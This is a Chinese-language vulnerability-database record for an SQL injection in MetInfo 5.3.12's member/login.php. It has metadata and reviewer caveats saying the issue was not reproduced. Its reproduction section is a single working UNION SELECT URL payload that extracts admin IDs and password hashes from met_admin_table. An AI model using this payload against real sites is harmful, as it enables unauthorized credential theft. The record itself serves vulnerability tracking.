---
source: "hatch 补库批 20260928"
product: "MetInfo5.3.12"
record_type: "vulnerability"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
primary_identifiers: ""
referenced_identifiers: ""
identifier_role: "unknown"
identifier_status: "unknown"
title: "MetInfo 5.3.12 member_login.php sql注入漏洞"
prerequisites: "来源所述条件，未列明部分仍待核：Web服务器接受login.php PATH_INFO，固定met_admin_table/29列结构"
side_effects: "未执行；原文未提供完整的状态变化与恢复证据，实际操作影响按本文入口、进程权限和实验条件核对"
source_status: "unknown"
id: "vw-1bc3ac0d43f4fae271b36b8b"
entity_id: "ve-1bc3ac0d43f4fae271b36b8b"
schema_version: "1"
---

## 核对与使用边界

本文已按保存的全文审阅记录进行文字校订；本轮仅静态核对，未运行 PoC、请求目标或逐图验证。

适用条件与版本记录（来源主张，未列为明确更正的部分仍待权威资料核对）：Web服务器接受login.php PATH_INFO，固定met_admin_table/29列结构

- **适用与权限边界（1）**：仅URL无原SQL/响应/鉴权，PATH_INFO配置重要未给。按此限制解释本文结论，版本相同不足以证明所需角色、入口、配置、依赖或可控参数均已满足；原操作和失败记录一并保留。

- **事实待核（2）**：原始#被编码处应保持，数据字段是哈希非明文；来源和修复缺失。该项尚不能从转载本身确定外部事实；下文相应编号、版本或修复说法只作为来源记录，不能据此判定部署受影响或已修复。明确更正另列于本节。

历史原文标识：下文原技术材料按来源保留；仅本节明确确认的更正替代相应旧说法，标为待核的观察仍不是事实确认。

# MetInfo 5.3.12 member/login.php sql注入漏洞

一、漏洞简介
------------

二、漏洞影响
------------

MetInfo 5.3.12

三、复现过程
------------

    https://www.0-sec.org/member/login.php/aa'UNION%20SELECT%20(select%20concat(admin_id,0x23,admin_pass)%20from%20met_admin_table%20limit%200,1),2,3,4,5,6,1111,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29%23/aa

![1.png](./.resource/MetInfo5.3.12member_login.phpsql注入漏洞/media/rId24.png)
